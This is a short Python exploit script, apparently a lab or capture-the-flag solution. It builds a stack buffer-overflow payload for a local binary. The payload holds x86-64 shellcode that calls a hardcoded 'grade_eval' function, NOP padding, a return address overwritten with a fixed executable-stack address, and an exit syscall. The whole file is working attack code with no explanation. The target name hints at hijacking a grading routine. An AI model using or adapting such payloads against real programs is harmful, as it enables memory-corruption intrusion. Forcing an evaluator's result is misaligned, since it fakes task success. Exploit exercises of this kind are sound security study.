#!/usr/bin/env python3
"""在固定的可执行栈上运行 grade_eval。"""
import struct
import sys

pack = struct.pack
stack = 0x721000800FD0
grade_eval = 0x401A87
code = (b"\xbf\x04\x00\x00\x00" + b"\x48\xb8" + pack("<Q", grade_eval)
        + b"\xff\xd0" + b"\xeb\x0d" + b"\x90\x90\x90")
exit_code = b"\xb8\x3c\x00\x00\x00\x31\xff\x0f\x05"
payload = code.ljust(24, b"\x90") + pack("<Q", stack) + exit_code

sys.stdout.buffer.write(payload)
